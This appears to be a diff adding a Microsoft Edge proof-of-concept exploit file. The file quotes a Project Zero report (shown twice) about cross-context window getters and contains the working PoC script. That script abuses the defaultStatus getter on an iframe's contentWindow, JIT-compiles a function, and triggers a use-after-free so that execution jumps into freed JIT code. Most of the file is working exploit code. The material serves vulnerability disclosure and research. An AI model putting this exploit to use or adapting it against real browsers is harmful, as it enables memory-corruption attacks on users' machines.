@@ -1,0 +1,117 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1043
+
+I noticed that some javascript getters behave strangely.
+
+My test code:
+
+var whitelist = ["closed", "document", "frames", "length", "location", "opener", "parent", "self", "top", "window"];
+
+var f = document.createElement("iframe");
+
+f.onload = () => {
+    f.onload = null;
+
+    for (var x in window) {
+        if (whitelist.indexOf(x) != -1)
+            continue;
+
+        try {
+            window.__lookupGetter__(x).call(f.contentWindow);
+            log(x);
+        } catch (e) {
+
+        }
+    }
+
+};
+
+f.src = "https://abc.xyz/";
+document.body.appendChild(f);
+
+And after some plays, finally reached an UAF condition. PoC is attached. RIP will jump into the freed JIT code.
+
+Tested on Microsoft Edge 38.14393.0.0.
+-->
+
+<!--
+
+Microsoft Edge: Undefined behavior on some getters
+
+I noticed that some javascript getters behave strangely.
+
+My test code:
+
+var whitelist = ["closed", "document", "frames", "length", "location", "opener", "parent", "self", "top", "window"];
+
+var f = document.createElement("iframe");
+
+f.onload = () => {
+    f.onload = null;
+
+    for (var x in window) {
+        if (whitelist.indexOf(x) != -1)
+            continue;
+
+        try {
+            window.__lookupGetter__(x).call(f.contentWindow);
+            log(x);
+        } catch (e) {
+
+        }
+    }
+
+};
+
+f.src = "https://abc.xyz/";
+document.body.appendChild(f);
+
+And after some plays, finally reached an UAF condition. PoC is attached. RIP will jump into the freed JIT code.
+
+Tested on Microsoft Edge 38.14393.0.0.
+
+-->
+
+
+<pre id="d">
+</pre>
+<body></body>
+
+<script>
+
+function log(txt) {
+    var c = document.createElement("div");
+    c.innerText = "log: " + txt;
+    d.appendChild(c);
+}
+
+function main() {
+    var f = document.createElement("iframe");
+    
+    f.onload = () => {
+        f.onload = () => {
+            var status = window.__lookupGetter__("defaultStatus").call(f.contentWindow);
+            var func_cons = status.constructor.constructor;
+
+            var ff = func_cons("return 0x12345;");
+            for (var i = 0; i < 0x100000; i++)
+                ff();
+
+            f.onload = () => {
+                alert("get ready");
+                ff();
+            };
+
+            f.src = "about:blank";
+        };
+
+        //a = f.contentWindow;
+        f.src = "about:blank";
+    };
+
+    document.body.appendChild(f);
+}
+
+main();
+
+</script>
